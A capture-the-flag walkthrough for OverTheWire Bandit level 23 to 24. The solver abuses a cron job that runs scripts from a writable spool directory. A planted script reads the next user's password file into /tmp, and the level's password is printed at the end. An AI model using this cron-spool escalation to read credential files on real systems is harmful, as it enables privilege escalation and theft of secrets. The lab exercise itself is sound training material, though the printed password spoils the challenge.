# bandit 23 to 24

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Commands you may need to solve this level

cron, crontab, crontab(5) (use “man 5 crontab” to access this)

---

### solve

> Same as last two levels.
>
> Check /usr/bin/cronjob_bandit24.sh
>
> ```bash
> bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh 
> #!/bin/bash
> 
> myname=$(whoami)
> 
> cd /var/spool/$myname
> echo "Executing and deleting all scripts in /var/spool/$myname:"
> for i in * .*;
> do
>     if [ "$i" != "." -a "$i" != ".." ];
>     then
> 	echo "Handling $i"
> 	timeout -s 9 60 ./$i
> 	rm -f ./$i
>     fi
> done
> ```
>
> The job moves /var/spool/(whoami) and execute all program and delete all.
>
> So, I check the permission of /var/spool 's files.
>
> ```bash
> bandit23@bandit:/var/spool$ ls -l
> total 480
> drwxrwx--- 2 bandit24 bandit23 479232 Jul 28 19:23 bandit24
> ```
>
> I knew it. bandit24 folder has next level permission.
>
> Before I started, remember changing mode of my working directory and shell script.
>
> I have spending too much time because I don't know that.
>
> Make a directory and shell script in it. Then copy the script to target directory.
>
> And wait one minute. Automatically executed my shell script creates a password file.
>
> ```bash
> bandit23@bandit:~$ mkdir /tmp/qqwweerr
> bandit23@bandit:~$ chmod 777 /tmp/qqwweerr
> bandit23@bandit:~$ cd /tmp/qqwweerr
> bandit23@bandit:~$ vi s.sh
> bandit23@bandit:/tmp/qqwweerr$ cat s.sh 
> #!/bin/bash
> cat /etc/bandit_pass/bandit24 >> /tmp/qqwweerr/teeet
> 
> bandit23@bandit:/tmp/qqwweerr$ ls
> s.sh
> bandit23@bandit:/tmp/qqwweerr$ cp s.sh /var/spool/bandit24/
> bandit23@bandit:/tmp/qqwweerr$ ls
> s.sh
> bandit23@bandit:/tmp/qqwweerr$ ls /var/spool/bandit24/
> efbente.sh  s.sh
> bandit23@bandit:/tmp/qqwweerr$ ls
> s.sh  teeet
> bandit23@bandit:/tmp/qqwweerr$ cat teeet 
> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
> ```
>
> password is  'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'.